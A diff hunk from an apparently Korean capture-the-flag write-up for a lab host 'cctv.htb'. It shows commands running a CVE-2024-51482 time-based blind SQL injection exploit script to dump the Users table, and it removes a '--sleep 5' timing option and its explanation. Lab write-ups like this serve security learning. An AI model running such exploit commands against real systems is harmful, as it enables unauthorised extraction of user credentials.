@@ -93,10 +93,10 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --test
 
 ![cve-2024-51482 exploit vulnerable](images/cve_2024_51482_exploit_vulnerable.png)
 
-`--users` 옵션으로 Users 테이블을 덤프한다. Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간이 소요된다. `--sleep 5` 옵션으로 HTB 네트워크 지연에 대응한다.
+`--users` 옵션으로 Users 테이블을 덤프한다. Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간이 소요된다. 
 
 ```bash
-python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --users --sleep 5
+python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --users 
 ```
 
 컬럼 열거 후 데이터 덤프가 진행된다.
